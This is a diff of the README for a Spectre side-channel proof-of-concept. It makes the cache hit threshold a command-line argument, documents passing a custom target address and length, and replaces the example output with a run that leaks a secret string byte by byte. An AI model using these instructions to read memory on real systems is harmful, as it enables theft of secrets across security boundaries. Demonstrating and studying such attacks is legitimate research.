@@ -34,67 +34,75 @@ If you want to build it manually, make sure to disable all optimisations (aka, d
 
 ## Executing
 
-To run specter with the example secret string "The Magic Words are Squeamish Ossifrage." as the target, simply run `./spectre.out` with no command line arguments.
+To run specter with default cache hit threshold of 80, and the secret example string "The Magic Words are Squeamish Ossifrage." as the target, run `./spectre.out` with no command line arguments.
 
-If desired, a custom target address and length can be given as the first and second command line arguments, respectively.
+**Example:** `./spectre.out`
+
+The cache hit threshold can be specified as the first command line argument. It must be a whole positive integer.
+
+**Example:** `./spectre.out 80`
+
+A custom target address and length can be given as the second and third command line arguments, respectively.
+
+**Example:** `./spectre.out 80 12345678 128`
 
 ## Tweaking
 
-If you're getting lackluster results, you may need to tweak the `CACHE_HIT_THRESHOLD`. This can be done by changing the line
-`#define CACHE_HIT_THRESHOLD (80)`.
+If you're getting lackluster results, you may need to tweak the cache hit threshold. This can be done by providing a threshold as the first command line argument.
 
-While a value of 80 appears to work for most desktop CPUs, a larger value may be required for slower CPUs. For example, on a AMD GX-412TC SOC, a value of 300 was required to get a good result.
-
-## Example output
-
-The following was output on an AMD GX-412TC SOC, with a `CACHE_HIT_THRESHOLD` of 300:
-
-`./spectre.out:`
-
-```
-Reading 40 bytes:
-Reading at malicious_x = 0xffffffffffdfed78... Success: 0x54=’T’ score=2
-Reading at malicious_x = 0xffffffffffdfed79... Success: 0x68=’h’ score=2
-Reading at malicious_x = 0xffffffffffdfed7a... Success: 0x65=’e’ score=2
-Reading at malicious_x = 0xffffffffffdfed7b... Success: 0x20=’ ’ score=2
-Reading at malicious_x = 0xffffffffffdfed7c... Success: 0x4D=’M’ score=2
-Reading at malicious_x = 0xffffffffffdfed7d... Success: 0x61=’a’ score=2
-Reading at malicious_x = 0xffffffffffdfed7e... Success: 0x67=’g’ score=2
-Reading at malicious_x = 0xffffffffffdfed7f... Unclear: 0x69=’i’ score=997 (second best: 0x75 score=979)
-Reading at malicious_x = 0xffffffffffdfed80... Unclear: 0x63=’c’ score=999 (second best: 0xC2 score=975)
-Reading at malicious_x = 0xffffffffffdfed81... Unclear: 0x20=’ ’ score=998 (second best: 0x15 score=977)
-Reading at malicious_x = 0xffffffffffdfed82... Unclear: 0x57=’W’ score=998 (second best: 0xB8 score=972)
-Reading at malicious_x = 0xffffffffffdfed83... Unclear: 0x6F=’o’ score=994 (second best: 0xC3 score=974)
-Reading at malicious_x = 0xffffffffffdfed84... Unclear: 0x72=’r’ score=997 (second best: 0xFC score=972)
-Reading at malicious_x = 0xffffffffffdfed85... Unclear: 0x64=’d’ score=997 (second best: 0xB7 score=975)
-Reading at malicious_x = 0xffffffffffdfed86... Unclear: 0x73=’s’ score=997 (second best: 0x75 score=977)
-Reading at malicious_x = 0xffffffffffdfed87... Unclear: 0x20=’ ’ score=998 (second best: 0xB7 score=975)
-Reading at malicious_x = 0xffffffffffdfed88... Unclear: 0x61=’a’ score=999 (second best: 0xCE score=976)
-Reading at malicious_x = 0xffffffffffdfed89... Unclear: 0x72=’r’ score=996 (second best: 0xB7 score=976)
-Reading at malicious_x = 0xffffffffffdfed8a... Unclear: 0x65=’e’ score=998 (second best: 0x1B score=978)
-Reading at malicious_x = 0xffffffffffdfed8b... Unclear: 0x20=’ ’ score=996 (second best: 0xC2 score=965)
-Reading at malicious_x = 0xffffffffffdfed8c... Unclear: 0x53=’S’ score=995 (second best: 0x7A score=967)
-Reading at malicious_x = 0xffffffffffdfed8d... Unclear: 0x71=’q’ score=996 (second best: 0x6A score=968)
-Reading at malicious_x = 0xffffffffffdfed8e... Unclear: 0x75=’u’ score=999 (second best: 0xB7 score=966)
-Reading at malicious_x = 0xffffffffffdfed8f... Unclear: 0x65=’e’ score=997 (second best: 0xFA score=966)
-Reading at malicious_x = 0xffffffffffdfed90... Unclear: 0x61=’a’ score=995 (second best: 0xA1 score=969)
-Reading at malicious_x = 0xffffffffffdfed91... Unclear: 0x6D=’m’ score=995 (second best: 0x8B score=963)
-Reading at malicious_x = 0xffffffffffdfed92... Unclear: 0x69=’i’ score=998 (second best: 0x1B score=966)
-Reading at malicious_x = 0xffffffffffdfed93... Unclear: 0x73=’s’ score=996 (second best: 0x24 score=960)
-Reading at malicious_x = 0xffffffffffdfed94... Unclear: 0x68=’h’ score=999 (second best: 0x27 score=964)
-Reading at malicious_x = 0xffffffffffdfed95... Unclear: 0x20=’ ’ score=994 (second best: 0xCE score=965)
-Reading at malicious_x = 0xffffffffffdfed96... Unclear: 0x4F=’O’ score=997 (second best: 0xEF score=963)
-Reading at malicious_x = 0xffffffffffdfed97... Unclear: 0x73=’s’ score=993 (second best: 0x48 score=976)
-Reading at malicious_x = 0xffffffffffdfed98... Unclear: 0x73=’s’ score=997 (second best: 0xB7 score=973)
-Reading at malicious_x = 0xffffffffffdfed99... Unclear: 0x69=’i’ score=998 (second best: 0xC8 score=962)
-Reading at malicious_x = 0xffffffffffdfed9a... Unclear: 0x66=’f’ score=994 (second best: 0xFA score=966)
-Reading at malicious_x = 0xffffffffffdfed9b... Unclear: 0x72=’r’ score=995 (second best: 0x3D score=968)
-Reading at malicious_x = 0xffffffffffdfed9c... Unclear: 0x61=’a’ score=994 (second best: 0x48 score=971)
-Reading at malicious_x = 0xffffffffffdfed9d... Unclear: 0x67=’g’ score=997 (second best: 0xFA score=972)
-Reading at malicious_x = 0xffffffffffdfed9e... Unclear: 0x65=’e’ score=994 (second best: 0x59 score=959)
-Reading at malicious_x = 0xffffffffffdfed9f... Unclear: 0x2E=’.’ score=995 (second best: 0x8B score=966)
-```
+While a value of 80 appears to work for most desktop CPUs, a larger value may be required for slower CPUs. For example, on a AMD GX-412TC SOC, a value of 100-300 was required to get a good result.
 
 ## Contributing
 
-Feel free to add your results to the "Results" issue. Include your `CACHE_HIT_THRESHOLD`, OS details, CPU details like vendor Id, family, model name, stepping, microcode, Mhz, and cache size. These can be found by running `uname -a` and `cat /proc/cpuinfo`.
+Feel free to add your results to the "Results" issue. Include your cache hit threshold, OS details, CPU details like vendor Id, family, model name, stepping, microcode, Mhz, and cache size. These can be found by running `uname -a` and `cat /proc/cpuinfo`.
+
+## Example output
+
+The following was output on an AMD GX-412TC SOC, with a cache hit threshold of 100:
+
+`./spectre.out 100:`
+
+```
+Using a cache hit threshold of 100.
+Reading 40 bytes:
+Reading at malicious_x = 0xffffffffffdfedc8... Success: 0x54=’T’ score=2
+Reading at malicious_x = 0xffffffffffdfedc9... Success: 0x68=’h’ score=2
+Reading at malicious_x = 0xffffffffffdfedca... Success: 0x65=’e’ score=2
+Reading at malicious_x = 0xffffffffffdfedcb... Success: 0x20=’ ’ score=2
+Reading at malicious_x = 0xffffffffffdfedcc... Success: 0x4D=’M’ score=2
+Reading at malicious_x = 0xffffffffffdfedcd... Success: 0x61=’a’ score=2
+Reading at malicious_x = 0xffffffffffdfedce... Success: 0x67=’g’ score=2
+Reading at malicious_x = 0xffffffffffdfedcf... Success: 0x69=’i’ score=2
+Reading at malicious_x = 0xffffffffffdfedd0... Success: 0x63=’c’ score=2
+Reading at malicious_x = 0xffffffffffdfedd1... Success: 0x20=’ ’ score=2
+Reading at malicious_x = 0xffffffffffdfedd2... Success: 0x57=’W’ score=2
+Reading at malicious_x = 0xffffffffffdfedd3... Success: 0x6F=’o’ score=2
+Reading at malicious_x = 0xffffffffffdfedd4... Success: 0x72=’r’ score=2
+Reading at malicious_x = 0xffffffffffdfedd5... Success: 0x64=’d’ score=2
+Reading at malicious_x = 0xffffffffffdfedd6... Success: 0x73=’s’ score=2
+Reading at malicious_x = 0xffffffffffdfedd7... Success: 0x20=’ ’ score=2
+Reading at malicious_x = 0xffffffffffdfedd8... Success: 0x61=’a’ score=2
+Reading at malicious_x = 0xffffffffffdfedd9... Success: 0x72=’r’ score=2
+Reading at malicious_x = 0xffffffffffdfedda... Success: 0x65=’e’ score=2
+Reading at malicious_x = 0xffffffffffdfeddb... Success: 0x20=’ ’ score=2
+Reading at malicious_x = 0xffffffffffdfeddc... Success: 0x53=’S’ score=2
+Reading at malicious_x = 0xffffffffffdfeddd... Success: 0x71=’q’ score=2
+Reading at malicious_x = 0xffffffffffdfedde... Success: 0x75=’u’ score=2
+Reading at malicious_x = 0xffffffffffdfeddf... Success: 0x65=’e’ score=2
+Reading at malicious_x = 0xffffffffffdfede0... Success: 0x61=’a’ score=2
+Reading at malicious_x = 0xffffffffffdfede1... Success: 0x6D=’m’ score=2
+Reading at malicious_x = 0xffffffffffdfede2... Success: 0x69=’i’ score=2
+Reading at malicious_x = 0xffffffffffdfede3... Success: 0x73=’s’ score=2
+Reading at malicious_x = 0xffffffffffdfede4... Success: 0x68=’h’ score=2
+Reading at malicious_x = 0xffffffffffdfede5... Success: 0x20=’ ’ score=2
+Reading at malicious_x = 0xffffffffffdfede6... Success: 0x4F=’O’ score=2
+Reading at malicious_x = 0xffffffffffdfede7... Success: 0x73=’s’ score=2
+Reading at malicious_x = 0xffffffffffdfede8... Success: 0x73=’s’ score=2
+Reading at malicious_x = 0xffffffffffdfede9... Success: 0x69=’i’ score=2
+Reading at malicious_x = 0xffffffffffdfedea... Success: 0x66=’f’ score=2
+Reading at malicious_x = 0xffffffffffdfedeb... Success: 0x72=’r’ score=2
+Reading at malicious_x = 0xffffffffffdfedec... Success: 0x61=’a’ score=2
+Reading at malicious_x = 0xffffffffffdfeded... Success: 0x67=’g’ score=2
+Reading at malicious_x = 0xffffffffffdfedee... Success: 0x65=’e’ score=2
+Reading at malicious_x = 0xffffffffffdfedef... Success: 0x2E=’.’ score=2
+```
